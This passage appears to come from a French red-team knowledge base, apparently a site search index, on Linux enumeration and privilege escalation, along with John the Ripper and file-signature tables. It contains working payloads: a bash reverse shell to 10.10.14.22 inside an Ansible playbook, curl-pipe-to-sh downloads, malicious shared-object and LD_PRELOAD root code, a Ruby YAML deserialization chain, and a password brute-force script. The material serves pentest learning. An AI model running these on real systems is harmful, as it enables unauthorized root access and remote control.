Automatis\u00e9e","text":"<ul> <li> <p>Objectif : Utiliser des scripts pr\u00e9-faits pour automatiser une grande partie de l'\u00e9num\u00e9ration. Tr\u00e8s utiles pour gagner du temps et couvrir un large spectre de v\u00e9rifications rapidement.</p> </li> <li> <p>LinEnum.sh: https://github.com/rebootuser/LinEnum</p> <p>```</p> </li> <li> <p>LinPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</p> <p>```</p> </li> <li> <p>LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester</p> <p>```</p> </li> </ul> <p>[!Attention]</p> <p>Les scripts automatis\u00e9s sont excellents mais peuvent g\u00e9n\u00e9rer beaucoup de \"bruit\" et de faux positifs. </p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#telecharger-et-executer","title":"T\u00e9l\u00e9charger et ex\u00e9cuter","text":"<p>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/linenum.sh chmod +x /tmp/linenum.sh /tmp/linenum.sh -t # Option -t pour inclure les tests plus pouss\u00e9s (thorough) ```</p> <ul> <li>Description : Un script shell classique et fiable qui effectue une s\u00e9rie de v\u00e9rifications syst\u00e8me, r\u00e9seau, utilisateur, et permissions. Moins \"agressif\" que LinPEAS mais couvre bien les bases. L'option <code>-t</code> ajoute des recherches plus approfondies (ex: SUID/SGID).</li> </ul>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#telecharger-et-executer_1","title":"T\u00e9l\u00e9charger et ex\u00e9cuter","text":"<p>wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh &gt; /tmp/linpeas_output.txt # Rediriger la sortie vers un fichier pour analyse</p>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#alternativement-pour-une-execution-moins-bruyante-sur-le-disque","title":"Alternativement, pour une ex\u00e9cution moins bruyante sur le disque :","text":""},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#curl-httpsgithubcomcarlospoloppeass-ngreleaseslatestdownloadlinpeassh-sh","title":"curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh","text":"<p>```</p> <ul> <li> <p>Description : LinPEAS (Linux Privilege Escalation Awesome Script) est l'un des scripts d'\u00e9num\u00e9ration les plus populaires et complets. Il effectue une multitude de v\u00e9rifications pour identifier rapidement les informations syst\u00e8me, les configurations potentiellement faibles, et surtout les vecteurs d'escalade de privil\u00e8ges.</p> </li> <li> <p>Fonctionnalit\u00e9s Cl\u00e9s : Il est particuli\u00e8rement reconnu pour sa sortie color\u00e9e qui met en \u00e9vidence les informations jug\u00e9es int\u00e9ressantes ou critiques (souvent en jaune/rouge), facilitant l'identification rapide des points d'int\u00e9r\u00eat. LinPEAS v\u00e9rifie en profondeur les permissions SUID/SGID (en les croisant avec GTFOBins), les capabilities, les t\u00e2ches cron, les services systemd, les fichiers/dossiers inscriptibles, les informations r\u00e9seau, les secrets potentiels dans les fichiers de configuration ou l'historique, les informations sur les conteneurs (Docker, LXC), les vuln\u00e9rabilit\u00e9s connues du kernel, et bien plus encore.</p> </li> <li> <p>Interpr\u00e9tation &amp; OPSEC : En raison de son exhaustivit\u00e9, LinPEAS g\u00e9n\u00e8re une sortie tr\u00e8s volumineuse. Il est fortement recommand\u00e9 de rediriger cette sortie vers un fichier (<code>&gt; /tmp/linpeas_output.txt</code>) pour pouvoir l'analyser tranquillement avec des outils comme <code>less</code> ou <code>grep</code>. Soyez conscient que son ex\u00e9cution peut \u00eatre gourmande en ressources et que sa signature est bien connue des outils de d\u00e9tection (EDR/AV), bien que des versions obfusqu\u00e9es existent. Notez qu'il existe \u00e9galement une version pour Windows, WinPEAS, tout aussi compl\u00e8te.</p> </li> </ul>"},{"location":"Red%20Team/Linux/Enum%C3%A9ration/#telecharger-et-executer_2","title":"T\u00e9l\u00e9charger et ex\u00e9cuter","text":"<p>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh chmod +x /tmp/les.sh /tmp/les.sh ```</p> <ul> <li>Description : Ce script se concentre sp\u00e9cifiquement sur l'identification d'exploits potentiels pour le kernel Linux en se basant sur la version du kernel (<code>uname -r</code>). Il compare la version d\u00e9tect\u00e9e avec une base de donn\u00e9es d'exploits connus. Utile pour une v\u00e9rification rapide des vuln\u00e9rabilit\u00e9s du noyau.</li> </ul>"},{"location":"Red%20Team/Linux/Privesc/Groupe%20LXC%20LXD/","title":"Groupe LXC LXD","text":"<p>Si notre utilisateur est membre du groupe lxd / lxc, il est possible de cr\u00e9er un conteneur. Cela nous donne la possibilit\u00e9 d'\u00eatre root sur ce conteneur, de monter la racine de l'host \u00e0 l'int\u00e9rieur du conteneur et donc de le lire avec les droits root.</p>"},{"location":"Red%20Team/Linux/Privesc/Groupe%20LXC%20LXD/#telecharger-une-image-de-conteneur-alpine-linux","title":"\ud83d\udcbe T\u00e9l\u00e9charger une image de conteneur Alpine Linux :","text":"<pre><code>wget https://dl-cdn.alpinelinux.org/alpine/v3.17/releases/x86_64/alpine-minirootfs-3.17.1-x86_64.tar.gz\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Groupe%20LXC%20LXD/#initialiser-lxd-au-besoin","title":"\ud83d\ude80 Initialiser LXD au besoin:","text":"<pre><code>lxd init\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Groupe%20LXC%20LXD/#importer-limage-alpine-comme-une-image-lxc","title":"\ud83d\udcdd Importer l'image Alpine comme une image LXC :","text":"<pre><code>lxc image import alpine-minirootfs-3.17.1-x86_64.tar.gz --alias alpine\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Groupe%20LXC%20LXD/#lancer-un-conteneur-alpine-avec-des-privileges-eleves","title":"\ud83d\udeeb Lancer un conteneur Alpine avec des privil\u00e8ges \u00e9lev\u00e9s :","text":"<pre><code>lxc init alpine r00t -c security.privileged=true`\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Groupe%20LXC%20LXD/#monter-le-disque-de-lhote-dans-le-conteneur","title":"\ud83e\udd5e Monter le disque de l'h\u00f4te dans le conteneur :","text":"<pre><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Groupe%20LXC%20LXD/#acceder-au-shell-dans-le-conteneur","title":"\ud83d\udc1a Acc\u00e9der au shell dans le conteneur :","text":"<pre><code>lxc start r00t\nlxc exec r00t /bin/sh\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Shared%20Object/","title":"Shared Object","text":"<p>Un binaire peut parfois utiliser des librairies non standards, il est parfois possible de remplacer cette librairie par une autre qui nous accorderait des droits suppl\u00e9mentaires.</p> <p>On analyse quelles librairies sont utilis\u00e9es par l'ex\u00e9cutable:</p> <pre><code>ldd LeBinaire\n</code></pre> <pre><code>linux-vdso.so.1 =&gt;  (0x00007ffcb3133000)\nlibshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)\nlibc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)\n</code></pre> <p>On peut ensuite utiliser \"readelf\" afin de voir si ces librairies ne peuvent pas \u00eatre load\u00e9es depuis un autre endroit:</p> <pre><code>readelf -d LeBinaire  | grep PATH\n\n0x000000000000001d (RUNPATH)            Library runpath: [/development]\n</code></pre> <p>Si le dossier est writeable, il est alors possible de remplacer cette librairie par une autre:</p> <pre><code>nano -w /development/libshared.c\n</code></pre> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\nvoid dbquery() {\n    printf(\"Malicious library loaded\\n\");\n    setuid(0);\n    system(\"/bin/sh -p\");\n}\n</code></pre> <pre><code>gcc /development/libshared.c -fPIC -shared -o /development/libshared.so\n</code></pre> <p>Pendant l'ex\u00e9cution du programme \"LeBinaire\", notre librairie est appel\u00e9e et lancera la commande d\u00e9finie avec les droits de l'utilisateur de \"LeBinaire\".</p>"},{"location":"Red%20Team/Linux/Privesc/Exploits/Playbook%20Ansible/","title":"Playbook Ansible","text":"<p>Exemple de playbook donnant l'acc\u00e8s \u00e0 un reverse-shell:</p> <pre><code>- hosts: localhost\n  tasks:\n  - name: rev\n    shell: bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.22/443 0&gt;&amp;1'\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Exploits/Script%20Bash/","title":"Script Bash","text":"<p>Dans un script bash, quelques \"erreurs\" peuvent devenir exploitables.</p>"},{"location":"Red%20Team/Linux/Privesc/Exploits/Script%20Bash/#comparaison-box-codify-sur-htb","title":"Comparaison (box \"codify\" sur HTB):","text":"<pre><code>#!/bin/bash\nDB_USER=\"root\"\nDB_PASS=$(/usr/bin/cat /root/.creds)\nBACKUP_DIR=\"/var/backups/mysql\"\n\nread -s -p \"Enter MySQL password for $DB_USER: \" USER_PASS\n/usr/bin/echo\n\nif [ $DB_PASS == $USER_PASS ](%20$DB_PASS%20==%20$USER_PASS%20); then\n        /usr/bin/echo \"Password confirmed!\"\nelse\n        /usr/bin/echo \"Password confirmation failed!\"\n        exit 1\nfi\n\n/usr/bin/mkdir -p \"$BACKUP_DIR\"\n\ndatabases=$(/usr/bin/mysql -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" -e \"SHOW DATABASES;\" | /usr/bin/grep -Ev \"(Database|information_schema|performance_schema)\")\n\nfor db in $databases; do\n    /usr/bin/echo \"Backing up database: $db\"\n    /usr/bin/mysqldump --force -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" \"$db\" | /usr/bin/gzip &gt; \"$BACKUP_DIR/$db.sql.gz\"\ndone\n\n/usr/bin/echo \"All databases backed up successfully!\"\n/usr/bin/echo \"Changing the permissions\"\n/usr/bin/chown root:sys-adm \"$BACKUP_DIR\"\n/usr/bin/chmod 774 -R \"$BACKUP_DIR\"\n/usr/bin/echo 'Done!'\n</code></pre> <p>La partie <code>if [ $DB_PASS == $USER_PASS ](%20$DB_PASS%20==%20$USER_PASS%20); then</code> est probl\u00e9matique : du fait de l'absence de double quote, la comparaison ne se fait pas sur une string compl\u00e8te, mais sur une valeur, on peut donc arriver \u00e0 un r\u00e9sultat de type <code>if password123 == *, then</code> au lieu de <code>if \"password\" == \"*\" then</code> ce qui entraine une faille de s\u00e9curit\u00e9.</p> <p>Il devient possible de bruteforcer le mot de passe attendu, avec un script de ce type :</p> <pre><code>import string\nimport subproccess\n\ndef check_password(p):\n    command = f\"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh\"\n    result = subprocess.run(command, shell=True, stdout=subproccess.PIPE, stderr=subproccess.PIPE, text=True)\n    return \"Password confirmed!\" in result.stdout\n\ncharset = string.ascii_letters + string.digits\npassword = \"\"\nis_password_found = False\n\nwhile not is_password_found:\n    for char in charset:\n        if check_password(password + char)\n            password += char\n            print(password)\n            break\n    else:\n        is_password_found = True\n</code></pre>"},{"location":"Red%20Team/Linux/Privesc/Exploits/YAML%20deserialization/","title":"YAML deserialization","text":"<p>Dans le cas d'un script faisant appel \u00e0 un fichier .yml via \"YAML.load\", il est possible de faire une d\u00e9s\u00e9rialization afin de faire ex\u00e9cuter une commande.</p> <p>Exemple: Un script ruby, utilisable via sudo:</p> <pre><code># Compare installed dependencies with those specified in \"dependencies.yml\"\nrequire \"yaml\"\nrequire 'rubygems'\n\n# TODO: update versions automatically\ndef update_gems()\nend\n\ndef list_from_file\n    YAML.load(File.read(\"dependencies.yml\"))\nend\n\ndef list_local_gems\n    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}\nend\n\ngems_file = list_from_file\ngems_local = list_local_gems\n\ngems_file.each do |file_name, file_version|\n    gems_local.each do |local_name, local_version|\n        if(file_name == local_name)\n            if(file_version != local_version)\n                puts \"Installed version differs from the one specified in file: \" + local_name\n            else\n                puts \"Installed version is equals to the one specified in file: \" + local_name\n            end\n        end\n    end\nend\n</code></pre> <p>On voit l'utilisation de la fonction YAML.load faisant un appel \u00e0 dependencies.yml.</p>"},{"location":"Red%20Team/Linux/Privesc/Exploits/YAML%20deserialization/#exploit","title":"Exploit","text":"<p>Cr\u00e9ation d'un fichier \"dependencies.yml\" dans le r\u00e9pertoire courant:</p> <pre><code>---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &amp;1 !ruby/object:Net::BufferedIO\n      io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry\n         read: 0\n         header: \"abc\"\n      debug_output: &amp;1 !ruby/object:Net::WriteAdapter\n         socket: &amp;1 !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module 'Kernel'\n                 method_id: :system\n             git_set: chmod u+s /bin/bash\n         method_id: :resolve\n</code></pre> <p>Apr\u00e8s ex\u00e9cution du script ruby via sudo, la commande</p> <pre><code>chmod u+s /bin/bash\n</code></pre> <p>est ex\u00e9cut\u00e9e. Il ne reste plus qu'\u00e0 faire:</p> <pre><code>bash -p\n</code></pre> <p>et nous voila root.</p>"},{"location":"Red%20Team/Linux/Privesc/Sudo/GTFObins/","title":"GTFObins","text":"<p>Si un binaire peut se lancer avec les droits sudo, il est toujours utile de chercher sur gtfobins si celui-ci ne permet pas d'ouvrir un shell directement:</p> <p>https://gtfobins.github.io/</p>"},{"location":"Red%20Team/Linux/Privesc/Sudo/ld_preload/","title":"Ld preload","text":"<ol> <li> <p>V\u00e9rifier les droits sudo :</p> </li> <li> <p>Commande : <code>sudo -l</code></p> </li> <li> <p>Lorsque <code>env_keep+=LD_PRELOAD</code> est pr\u00e9sent dans la configuration de sudo, cela signifie que la variable d'environnement <code>LD_PRELOAD</code> est conserv\u00e9e lors de l'ex\u00e9cution des commandes avec <code>sudo</code>.</p> </li> <li> <p>Cr\u00e9er le fichier source C (root.c) :</p> </li> <li> <p>Commande : <code>nano -w /tmp/root.c</code></p> </li> <li> <p>Le code C cr\u00e9e une biblioth\u00e8que partag\u00e9e qui, lorsqu'elle est charg\u00e9e, ex\u00e9cute son code d'initialisation (<code>_init()</code>). Ce code modifie l'ID utilisateur (UID) et l'ID de groupe (GID) du processus en 0 (c'est-\u00e0-dire <code>root</code>), puis lance un shell Bash.</p> </li> <li> <p>Compiler le fichier source en biblioth\u00e8que partag\u00e9e :</p> </li> <li> <p>Commande : <code>gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles</code></p> </li> <li> <p>Cette commande compile le fichier <code>root.c</code> en une biblioth\u00e8que partag\u00e9e <code>root.so</code>. L'option <code>-fPIC</code> cr\u00e9e du code position ind\u00e9pendant, n\u00e9cessaire pour les biblioth\u00e8ques partag\u00e9es, et <code>-nostartfiles</code> emp\u00eache gcc d'utiliser les fichiers de d\u00e9marrage standard, ce qui n'est pas n\u00e9cessaire pour ce type de charge utile.</p> </li> <li> <p>Ex\u00e9cuter une commande avec <code>sudo</code> en utilisant <code>LD_PRELOAD</code> :</p> </li> <li> <p>Commande : <code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/executable restart</code></p> </li> <li>Ici, <code>LD_PRELOAD</code> est utilis\u00e9 pour pr\u00e9charger <code>root.so</code>. Lorsque la commande <code>/usr/sbin/executable</code> (qui doit \u00eatre une commande autoris\u00e9e par <code>sudo</code>) est ex\u00e9cut\u00e9e, elle charge <code>root.so</code> avant toute autre biblioth\u00e8que. Cela entra\u00eene l'ex\u00e9cution du code dans <code>_init()</code>, \u00e9levant ainsi les privil\u00e8ges du processus \u00e0 ceux de <code>root</code>.</li> </ol> <p>Contenu de root.c:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}\n</code></pre>"},{"location":"Red%20Team/Misc/Cr%C3%A9ation%20de%20wordlists/","title":"Cr\u00e9ation de wordlists","text":""},{"location":"Red%20Team/Misc/Cr%C3%A9ation%20de%20wordlists/#cupp","title":"cupp","text":"<p>https://github.com/Mebus/cupp</p> <p>Permet la cr\u00e9ation de wordlist de mani\u00e8re interactive.</p> <pre><code>cupp -i\n</code></pre>"},{"location":"Red%20Team/Misc/Cr%C3%A9ation%20de%20wordlists/#username-anarchy","title":"Username anarchy","text":"<p>https://github.com/urbanadventurer/username-anarchy Permet de cr\u00e9er des permutations sur des noms d'utilisateurs.</p> <pre><code>./username-anarchy Bill Gates &gt; bill.txt\n</code></pre>"},{"location":"Red%20Team/Misc/Cr%C3%A9ation%20de%20wordlists/#cewl","title":"Cewl","text":"<p>Cewl va parser des pages web et cr\u00e9er une wordlist \u00e0 partir des termes les plus pertinents.</p> <pre><code>cewl domain.com -m 5 -w wordlist.txt\n</code></pre>"},{"location":"Red%20Team/Misc/Format%20hash%20john%20the%20ripper/","title":"Format hash john the ripper","text":"Hash Format Example Command Description afs <code>john --format=afs hashes_to_crack.txt</code> AFS (Andrew File System) password hashes bfegg <code>john --format=bfegg hashes_to_crack.txt</code> bfegg hashes used in Eggdrop IRC bots bf <code>john --format=bf hashes_to_crack.txt</code> Blowfish-based crypt(3) hashes bsdi <code>john --format=bsdi hashes_to_crack.txt</code> BSDi crypt(3) hashes crypt(3) <code>john --format=crypt hashes_to_crack.txt</code> Traditional Unix crypt(3) hashes des <code>john --format=des hashes_to_crack.txt</code> Traditional DES-based crypt(3) hashes dmd5 <code>john --format=dmd5 hashes_to_crack.txt</code> DMD5 (Dragonfly BSD MD5) password hashes dominosec <code>john --format=dominosec hashes_to_crack.txt</code> IBM Lotus Domino 6/7 password hashes EPiServer SID hashes <code>john --format=episerver hashes_to_crack.txt</code> EPiServer SID (Security Identifier) password hashes hdaa <code>john --format=hdaa hashes_to_crack.txt</code> hdaa password hashes used in Openwall GNU/Linux hmac-md5 <code>john --format=hmac-md5 hashes_to_crack.txt</code> hmac-md5 password hashes hmailserver <code>john --format=hmailserver hashes_to_crack.txt</code> hmailserver password hashes ipb2 <code>john --format=ipb2 hashes_to_crack.txt</code> Invision Power Board 2 password hashes krb4 <code>john --format=krb4 hashes_to_crack.txt</code> Kerberos 4 password hashes krb5 <code>john --format=krb5 hashes_to_crack.txt</code> Kerberos 5 password hashes LM <code>john --format=LM hashes_to_crack.txt</code> LM (Lan Manager) password hashes lotus5 <code>john --format=lotus5 hashes_to_crack.txt</code> Lotus Notes/Domino 5 password hashes md4-gen <code>john --format=md4-gen hashes_to_crack.txt</code> Generic MD4 password hashes md5 <code>john --format=md5 hashes_to_crack.txt</code> MD5 password hashes md5-gen <code>john --format=md5-gen hashes_to_crack.txt</code> Generic MD5 password hashes mscash <code>john --format=mscash hashes_to_crack.txt</code> MS Cache password hashes mscash2 <code>john --format=mscash2 hashes_to_crack.txt</code> MS Cache v2 password hashes mschapv2 <code>john --format=mschapv2 hashes_to_crack.txt</code> MS CHAP v2 password hashes mskrb5 <code>john --format=mskrb5 hashes_to_crack.txt</code> MS Kerberos 5 password hashes mssql05 <code>john --format=mssql05 hashes_to_crack.txt</code> MS SQL 2005 password hashes mssql <code>john --format=mssql hashes_to_crack.txt</code> MS SQL password hashes mysql-fast <code>john --format=mysql-fast hashes_to_crack.txt</code> MySQL fast password hashes mysql <code>john --format=mysql hashes_to_crack.txt</code> MySQL password hashes mysql-sha1 <code>john --format=mysql-sha1 hashes_to_crack.txt</code> MySQL SHA1 password hashes NETLM <code>john --format=netlm hashes_to_crack.txt</code> NETLM (NT LAN Manager) password hashes NETLMv2 <code>john --format=netlmv2 hashes_to_crack.txt</code> NETLMv2 (NT LAN Manager version 2) password hashes NETNTLM <code>john --format=netntlm hashes_to_crack.txt</code> NETNTLM (NT LAN Manager) password hashes NETNTLMv2 <code>john --format=netntlmv2 hashes_to_crack.txt</code> NETNTLMv2 (NT LAN Manager version 2) password hashes NEThalfLM <code>john --format=nethalflm hashes_to_crack.txt</code> NEThalfLM (NT LAN Manager) password hashes md5ns <code>john --format=md5ns hashes_to_crack.txt</code> md5ns (MD5 namespace) password hashes nsldap <code>john --format=nsldap hashes_to_crack.txt</code> nsldap (OpenLDAP SHA) password hashes ssha <code>john --format=ssha hashes_to_crack.txt</code> ssha (Salted SHA) password hashes NT <code>john --format=nt hashes_to_crack.txt</code> NT (Windows NT) password hashes openssha <code>john --format=openssha hashes_to_crack.txt</code> OPENSSH private key password hashes oracle11 <code>john --format=oracle11 hashes_to_crack.txt</code> Oracle 11 password hashes oracle <code>john --format=oracle hashes_to_crack.txt</code> Oracle password hashes pdf <code>john --format=pdf hashes_to_crack.txt</code> PDF (Portable Document Format) password hashes phpass-md5 <code>john --format=phpass-md5 hashes_to_crack.txt</code> PHPass-MD5 (Portable PHP password hashing framework) password hashes phps <code>john --format=phps hashes_to_crack.txt</code> PHPS password hashes pix-md5 <code>john --format=pix-md5 hashes_to_crack.txt</code> Cisco PIX MD5 password hashes po <code>john --format=po hashes_to_crack.txt</code> Po (Sybase SQL Anywhere) password hashes rar <code>john --format=rar hashes_to_crack.txt</code> RAR (WinRAR) password hashes raw-md4 <code>john --format=raw-md4 hashes_to_crack.txt</code> Raw MD4 password hashes raw-md5 <code>john --format=raw-md5 hashes_to_crack.txt</code> Raw MD5 password hashes raw-md5-unicode <code>john --format=raw-md5-unicode hashes_to_crack.txt</code> Raw MD5 Unicode password hashes raw-sha1 <code>john --format=raw-sha1 hashes_to_crack.txt</code> Raw SHA1 password hashes raw-sha224 <code>john --format=raw-sha224 hashes_to_crack.txt</code> Raw SHA224 password hashes raw-sha256 <code>john --format=raw-sha256 hashes_to_crack.txt</code> Raw SHA256 password hashes raw-sha384 <code>john --format=raw-sha384 hashes_to_crack.txt</code> Raw SHA384 password hashes raw-sha512 <code>john --format=raw-sha512 hashes_to_crack.txt</code> Raw SHA512 password hashes salted-sha <code>john --format=salted-sha hashes_to_crack.txt</code> Salted SHA password hashes sapb <code>john --format=sapb hashes_to_crack.txt</code> SAP CODVN B (BCODE) password hashes sapg <code>john --format=sapg hashes_to_crack.txt</code> SAP CODVN G (PASSCODE) password hashes sha1-gen <code>john --format=sha1-gen hashes_to_crack.txt</code> Generic SHA1 password hashes skey <code>john --format=skey hashes_to_crack.txt</code> S/Key (One-time password) hashes ssh <code>john --format=ssh hashes_to_crack.txt</code> SSH (Secure Shell) password hashes sybasease <code>john --format=sybasease hashes_to_crack.txt</code> Sybase ASE password hashes xsha <code>john --format=xsha hashes_to_crack.txt</code> xsha (Extended SHA) password hashes zip <code>john --format=zip hashes_to_crack.txt</code> ZIP (WinZip) password hashes Tool Description <code>pdf2john</code> Converts PDF documents for John <code>ssh2john</code> Converts SSH private keys for John <code>mscash2john</code> Converts MS Cash hashes for John <code>keychain2john</code> Converts OS X keychain files for John <code>rar2john</code> Converts RAR archives for John <code>pfx2john</code> Converts PKCS#12 files for John <code>truecrypt_volume2john</code> Converts TrueCrypt volumes for John <code>keepass2john</code> Converts KeePass databases for John <code>vncpcap2john</code> Converts VNC PCAP files for John <code>putty2john</code> Converts PuTTY private keys for John <code>zip2john</code> Converts ZIP archives for John <code>hccap2john</code> Converts WPA/WPA2 handshake captures for John <code>office2john</code> Converts MS Office documents for John <code>wpa2john</code> Converts WPA/WPA2 handshakes for John"},{"location":"Red%20Team/Misc/MagicByte/","title":"MagicByte","text":"HEX ISO 8859-1 Offset Extension Description <code>23 21</code> <code>#!</code> 0 Script or data to be passed to the program following the shebang (#!)1(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-1) <code>00 00 02 00 06 04 06 00 08 00 00 00 00 00</code> <code>\u2400\u2400\u2402\u2400\u2406\u2404\u2406\u2400\u2408\u2400\u2400\u2400\u2400\u2400</code> 0 wk1 Lotus 1-2-3 spreadsheet (v1) file <code>00 00 1A 00 00 10 04 00 00 00 00 00</code> <code>\u2400\u2400\u241a\u2400\u2400\u240a\u2404\u2400\u2400\u2400\u2400\u2400</code> 0 wk3 Lotus 1-2-3 spreadsheet (v3) file <code>00 00 1A 00 02 10 04 00 00 00 00 00</code> <code>\u2400\u2400\u241a\u2400\u2402\u240a\u2404\u2400\u2400\u2400\u2400\u2400</code> 0 wk4  wk5 Lotus 1-2-3 spreadsheet (v4, v5) file <code>00 00 1A 00 05 10 04</code> <code>\u2400\u2400\u241a\u2400\u2405\u240a\u2404</code> 0 123 Lotus 1-2-3 spreadsheet (v9) file <code>00 00 03 F3</code> <code>\u2400\u2400\u2403\u00f3</code> 0 Amiga Hunk executable file <code>00 00 49 49 58 50 52</code> (little-endian)  <code>00 00 4D 4D 58 50 52</code> (big-endian) <code>\u2400\u2400IIXPR</code> <code>\u2400\u2400MMXPR</code> 0 qxd Quark Express document <code>50 57 53 33</code> <code>PWS3</code> 0 psafe3 Password Gorilla Password Database <code>D4 C3 B2 A1</code> (little-endian) <code>\u00d4\u00c3\u00b2\u00a1</code> 0 pcap Libpcap File Format2(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Libpcap_File_Format-2) <code>A1 B2 C3 D4</code> (big-endian) <code>\u00a1\u00b2\u00c3\u00d4</code> <code>4D 3C B2 A1</code> (little-endian) <code>M&lt;\u00b2\u00a1</code> 0 pcap Libpcap File Format (nanosecond-resolution)2(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-Libpcap_File_Format-2) <code>A1 B2 3C 4D</code> (big-endian) <code>\u00a1\u00b2&lt;M</code> <code>0A 0D 0D 0A</code> <code>\u240a\u240d\u240d\u240a</code> 0 pcapng PCAP Next Generation Dump File Format3(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-3) <code>ED AB EE DB</code> <code>\u00ed\u00ab\u00ee\u00db</code> 0 rpm RedHat Package Manager (RPM) package4(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-4) <code>53 51 4C 69 74 65 20 66   6F 72 6D 61 74 20 33 00</code> <code>SQLite format 3\u2400</code> 0 sqlitedb  sqlite  db SQLite Database5(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-5) <code>53 50 30 31</code> <code>SP01</code> 0 bin Amazon Kindle Update Package6(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-6) <code>49 57 41 44</code> <code>IWAD</code> 0 wad internal WAD (main resource file of Doom)7(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-IWAD-7) <code>00</code> <code>\u2400</code> 0 PIC  PIF  SEA  YTR IBM Storyboard bitmap file  Windows Program Information File Mac Stuffit Self-Extracting Archive  IRIS OCR data file <code>00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00</code> <code>\u2400\u2400\u2400\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2400\u2400\u2400   \u2400\u2400\u2400\u2400\u2400\u2400\u2400\u2400</code> 11 PDB PalmPilot Database/Document File <code>BE BA FE CA</code> <code>\u00be\u00ba\u00fe\u00ca</code> 0 DBA Palm Desktop Calendar Archive <code>00 01 42 44</code> <code>\u2400\u2401BD</code> 0 DBA Palm Desktop To Do Archive <code>00 01 44 54</code> <code>\u2400\u2401DT</code> 0 TDA Palm Desktop Calendar Archive <code>54 44 46 24</code> <code>TDF$</code> 0 TDF$ Telegram Desktop File <code>54 44 45 46</code> <code>TDEF</code> 0 TDEF Telegram Desktop Encrypted File <code>00 01 00 00</code> <code>\u2400\u2401\u2400\u2400</code> 0 Palm Desktop Data File (Access format) <code>00 00 01 00</code> <code>\u2400\u2400\u2401\u2400</code> 0 ico Computer icon encoded in ICO file format8(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-8) <code>69 63 6e 73</code> <code>icns</code> 0 icns Apple Icon Image format <code>66 74 79 70 33 67</code> <code>ftyp3g</code> 4 3gp  3g2 3rd Generation Partnership Project 3GPP and 3GPP2 multimedia files <code>66 74 79 70 68 65 69 6``66 74 79 70 6d</code> <code>ftypheic</code> 4 heic High Efficiency Image Container (HEIC) <code>1F 9D</code> <code>\u241f\u25a1</code> 0 z  tar.z compressed file (often tar zip) using Lempel-Ziv-Welch algorithm <code>1F A0</code> <code>\u241f\u237d</code> 0 z  tar.z Compressed file (often tar zip) using LZH algorithm <code>2D 68 6C 30 2D</code> <code>-lh0-</code> 2 lzh Lempel Ziv Huffman archive file Method 0 (No compression) <code>2D 68 6C 35 2D</code> <code>-lh5-</code> 2 lzh Lempel Ziv Huffman archive file Method 5 (8KiB sliding window) <code>42 41 43 4B 4D 49 4B 45   44 49 53 4B</code> <code>BACKMIKEDISK</code> 0 bac AmiBack Amiga Backup data file <code>49 4E 44 58</code> <code>INDX</code> 0 idx AmiBack Amiga Backup index file <code>62 70 6C 69 73 74</code> <code>bplist</code> 0 plist Binary Property List file <code>42 5A 68</code> <code>BZh</code> 0 bz2 Compressed file using Bzip2 algorithm <code>47 49 46 38 37 61</code> <code>47 49 46 38 39 61</code> <code>GIF87a</code> <code>GIF89a</code> 0 gif Image file encoded in the Graphics Interchange Format (GIF)9(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-9) <code>49 49 2A 00</code> (little-endian) <code>II*\u2400</code> 0 tif  tiff Tagged Image File Format (TIFF)10(https://en.wikipedia.org/wiki/List_of_file_signatures#cite_note-10) <code>4D 4D 00 2A</code> (big-endian) <code>MM\u2400*</code> <code>49 49 2A 00 10 00 00 00   43 52</code> 